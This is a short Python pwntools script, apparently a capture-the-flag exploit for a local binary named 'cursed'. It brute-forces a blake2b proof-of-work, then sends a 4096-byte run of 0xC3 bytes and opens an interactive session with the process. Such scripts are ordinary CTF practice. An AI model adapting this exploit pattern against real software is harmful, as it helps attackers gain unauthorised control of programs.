from pwn import *
from hashlib import blake2b, sha512
import itertools

p = process("./cursed")

def pow():
    randstr = p.recv()
    for i in itertools.permutations(range(256),48):
        msg = "".join([chr(x) for x in i])
        data = randstr + msg.encode('latin')
        hsh = blake2b(data, digest_size=0x10).digest()
        if hsh[0] | hsh[1] | hsh[2] == 0:
            print(hsh)
            break
    p.send(msg.encode("latin"))

pow()
p.send("\xC3"*0x1000)
p.interactive()